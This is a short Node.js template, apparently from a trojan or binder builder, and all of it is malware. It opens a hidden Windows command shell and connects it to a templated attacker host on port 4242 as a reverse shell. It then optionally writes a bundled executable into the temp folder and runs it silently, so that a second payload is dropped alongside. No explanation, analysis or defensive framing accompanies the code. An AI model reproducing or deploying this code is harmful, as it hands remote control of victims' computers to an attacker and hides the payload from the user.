(function () {
    var net = require("net"),
    os = require('os'),
    cp = require("child_process"),
    fs = require('fs'),
    path = require('path'),
    sh = cp.spawn("cmd", [], {detached: true, shell: false, windowsHide: true});

    Promise.all([
        new Promise((resolve) => {
            // connect shell
            var client = new net.Socket();
            client.connect(4242, "{{HOST}}", function () {
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
                sh.stderr.pipe(client);
            });
            resolve();
        }),
        new Promise((resolve) => {
            try {
                // run merged exe (if any)
                var hasMergeExe = "{{HAS_MERGE}}";
                if(hasMergeExe == "true"){
                    var mergeExeBuffer = fs.readFileSync(path.join(__dirname, './winResource.exe'));
                    let extractPath = path.normalize(path.join(os.tmpdir(), './mergeExe.exe'));
                    fs.writeFileSync(extractPath, mergeExeBuffer);
                    cp.spawn(extractPath, [], {detached: true, shell: false, windowsHide: true})
                }
                resolve();
            } catch { resolve() }
        }),
    ])
    return /a/; // don't close the process
})();